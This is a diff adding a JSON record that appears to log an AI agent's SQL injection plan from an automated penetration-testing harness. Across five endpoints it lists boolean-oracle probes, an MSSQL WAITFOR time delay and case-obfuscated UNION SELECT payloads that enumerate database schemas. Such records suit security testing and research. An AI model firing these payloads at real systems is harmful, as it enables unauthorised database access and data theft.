@@ -1,0 +1,68 @@
+{
+ "key": "sqli_5",
+ "model": "opencode/deepseek-v4.1-flash-free",
+ "class": "sqli",
+ "variants": [
+  {
+   "endpoint": "GET /reports/sales/summary",
+   "target_param": "period",
+   "recon_evidence": "The period value is treated as a raw string inside a quoted WHERE clause; supplying 1'>'0 returned the full monthly totals table, and a lone single quote triggered a MySQL syntax error in the response.",
+   "planner_rationale": "Pair the confirmed TRUE probe with its documented FALSE control before driving further logic.",
+   "vuln_class": "sqli",
+   "payload": "0'>'1",
+   "injection_point": "query",
+   "expected_success_signal": "Empty or reduced response versus the true probe",
+   "confidence": 0.82,
+   "reasoning": "With the true probe 1'>'0 already returning the full totals table, reversing the comparison to 0'>'1 yields the false leg of the oracle; any content difference between the two confirms the period parameter governs quote-delimited query logic."
+  },
+  {
+   "endpoint": "GET /api/v2/inventory/stock",
+   "target_param": "X-Store-Id",
+   "recon_evidence": "MSSQL confirmed via @@version error strings; the X-Store-Id header value is copied verbatim into the WHERE clause, and a trailing single quote produced a syntax error indicating the parameter terminates a string literal.",
+   "planner_rationale": "MSSQL backend confirmed; use the native timer to prove the header value reaches the query.",
+   "vuln_class": "sqli",
+   "payload": "1' WAITFOR DELAY '0:0:10",
+   "injection_point": "header",
+   "expected_success_signal": "Response delayed exactly 10 seconds",
+   "confidence": 0.86,
+   "reasoning": "The MSSQL timing table selects WAITFOR DELAY; a consistent 10-second pause on the header value confirms the leading quote closes a string literal and that the header reaches a stackable query context."
+  },
+  {
+   "endpoint": "POST /search/advanced",
+   "target_param": "query",
+   "recon_evidence": "The JSON body field sits in a quoted WHERE clause; a three-column result row was confirmed and the second column is echoed back in the JSON response, with MySQL confirmed by error fingerprinting.",
+   "planner_rationale": "Enumerate database names by reading the reflected second column.",
+   "vuln_class": "sqli",
+   "payload": "-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata",
+   "injection_point": "body",
+   "expected_success_signal": "Pipe-delimited list of all database names in the reflected column",
+   "confidence": 0.9,
+   "reasoning": "The verbatim mixed-casing payload matches the confirmed three-column shape and the reflected second slot, so GROUP_CONCAT collapses every schema name into the single field rendered back in the JSON response."
+  },
+  {
+   "endpoint": "GET /account/preferences",
+   "target_param": "layout",
+   "recon_evidence": "The layout cookie value is placed into a quoted comparison; 1'>'0 returned the populated grid layout, while a lone single quote produced a MySQL syntax error, confirming the cookie value reaches the query unescaped.",
+   "planner_rationale": "Confirm the FALSE branch of the boolean oracle for the cookie-sourced value.",
+   "vuln_class": "sqli",
+   "payload": "0'>'1",
+   "injection_point": "cookie",
+   "expected_success_signal": "Default/empty layout or reduced content versus the true probe",
+   "confidence": 0.72,
+   "reasoning": "The layout cookie is concatenated into a quoted predicate, so 0'>'1 supplies the false leg; a content difference against the confirmed true probe proves the cookie value drives query logic rather than being validated client-side."
+  },
+  {
+   "endpoint": "GET /store/product/{sku}",
+   "target_param": "sku",
+   "recon_evidence": "The path segment is inserted into a quoted WHERE clause; a negative value returned no product row, three result columns were confirmed, and the third column is reflected into the rendered detail page on MySQL.",
+   "planner_rationale": "Path segment is quote-injectable into the SELECT; enumerate schemas through the reflected third slot.",
+   "vuln_class": "sqli",
+   "payload": "-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata",
+   "injection_point": "path",
+   "expected_success_signal": "Pipe-delimited list of all database names in the reflected third column",
+   "confidence": 0.78,
+   "reasoning": "The verbatim three-column UNION payload matches the confirmed column count and targets the reflected third position, so the aggregated schema list surfaces directly in the product detail page despite the injection living in the path segment."
+  }
+ ],
+ "raw_tail": "Pipe-delimited list of all database names in the reflected third column\",\n  \"confidence\": 0.78,\n  \"reasoning\": \"The verbatim three-column UNION payload matches the confirmed column count and targets the reflected third position, so the aggregated schema list surfaces directly in the product detail page despite the injection living in the path segment.\"\n }\n]\n\u001b[0m\n> build · deepseek-v4.1-flash-free\n"
+}
